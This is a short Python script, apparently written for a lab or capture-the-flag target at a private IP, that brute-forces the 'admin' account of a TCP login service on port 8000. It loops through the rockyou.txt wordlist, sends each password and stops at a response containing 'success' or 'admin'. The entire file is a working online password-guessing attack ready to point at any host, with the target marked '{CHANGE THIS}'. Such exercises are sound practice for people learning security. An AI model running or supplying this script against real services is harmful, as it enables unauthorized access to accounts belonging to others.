import socket



target_ip = "10.48.128.93"  # Target IP {CHANGE THIS}
target_port = 8000          # Target port
password_wordlist = "/usr/share/wordlists/rockyou.txt"

def connect_and_send_password(password):
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((target_ip, target_port))
        client_socket.sendall(b'admin\n')

        response = client_socket.recv(1024).decode()
        print(f"Server response after sending 'admin': {response}")
        
        if "Password:" in response:
            print(f"Trying password: {password}")
            client_socket.sendall(password.encode() + b"\n")
            
            response = client_socket.recv(1024).decode()

            if "success" in response.lower() or "admin" in response.lower():
                print(f"Server respondse for password '{password}': {response}")
                return True
            
            else:
                print(f"Passwsd wrong")
        return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    
    finally:
        client_socket.close()


def fuzz_words():
    with open(password_wordlist, 'r', encoding="latin-1") as f:
        passwords = f.readlines()
    
    for password in passwords:
        password = password.strip()
        
        if connect_and_send_password(password):
            print(f"Found correct password {password}")
            break
        else:
            print(f"wrong pass, {password}, reconnecting...")


fuzz_words()





